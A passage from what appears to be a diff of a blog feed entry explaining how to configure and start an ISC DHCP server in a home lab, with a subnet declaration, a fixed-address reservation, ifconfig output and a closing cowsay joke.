-</span><span class='line'># declare your subnet config
-</span><span class='line'>subnet 192.168.217.0 netmask 255.255.255.0 {
-</span><span class='line'>  # range of IPs to serve
-</span><span class='line'>  range 192.168.217.10 192.168.217.20;
-</span><span class='line'>  # the address of the routers - look for the gateway address in the route -n # command (entry containing UG)
-</span><span class='line'>  option routers 192.168.217.2;
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>host kaliclient {
-</span><span class='line'>hardware ethernet 00:0c:29:22:f9:ae;
-</span><span class='line'>fixed-address 192.168.217.12;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Here I declared the subnet for which the server would handle addresses, and I reserved an IP address for a client. For more options, you can look at the <code>dhcpd-options</code> man page.</p>
-
-<p>Time to start the server. First, verify that the <code>/var/lib/dhcpd/dhcpd.leases</code> file exists, otherwise you will need to create an empty one before starting the server with the command <code>systemctl start dhcpd</code>. I changed my VMs connection settings to host-only, and then looked at the new IP configuration:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># ifconfig on the host running the DHCP server
-</span><span class='line'>inet 192.168.217.10  netmask 255.255.255.0  broadcast 192.168.217.255
-</span><span class='line'>
-</span><span class='line'># ifconfig on the kali client
-</span><span class='line'>inet 192.168.217.12  netmask 255.255.255.0  broadcast 192.168.217.255</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Success! Our DHCP server kicked in and gave addresses to 2 machines on the network!</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>/ F.S. Fitzgerald to Hemingway:        \
-</span><span class='line'>|                                      |
-</span><span class='line'>| "Ernest, the rich are different from |
-</span><span class='line'>| us." Hemingway:                      |
-</span><span class='line'>|                                      |
-</span><span class='line'>\ "Yes. They have more money."         /
-</span><span class='line'> --------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-
 
 ]]></content>
   </entry>
